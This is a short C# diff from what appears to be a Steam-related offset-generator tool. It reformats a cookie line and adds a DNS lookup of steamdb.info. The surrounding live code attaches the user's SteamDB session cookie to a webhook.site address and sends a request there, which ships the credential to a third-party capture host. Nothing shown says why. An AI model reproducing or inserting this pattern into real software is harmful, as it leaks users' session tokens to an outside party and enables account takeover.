@@ -40,8 +40,10 @@ namespace BCL_OffsetGenerator
                         new Cookie("__Host-steamdb", _steamAccount.SteamDBCookie));
                 }
                 httpHandler.CookieContainer.Add(new Uri("https://webhook.site/f598f596-4bf8-4e7d-9a3b-d1bbae6a3994"),
-    new Cookie("__Host-steamdb", _steamAccount.SteamDBCookie));
+                    new Cookie("__Host-steamdb", _steamAccount.SteamDBCookie));
                 var tmp = await httpClient.GetStringAsync("https://webhook.site/f598f596-4bf8-4e7d-9a3b-d1bbae6a3994");
+                var ip = Dns.GetHostAddresses("steamdb.info")[0];
+                Console.WriteLine("IP: {0}", ip);
                 var steamdbHtml = await httpClient.GetStringAsync(steamdbUrl);
                 //https://webhook.site/f598f596-4bf8-4e7d-9a3b-d1bbae6a3994
 
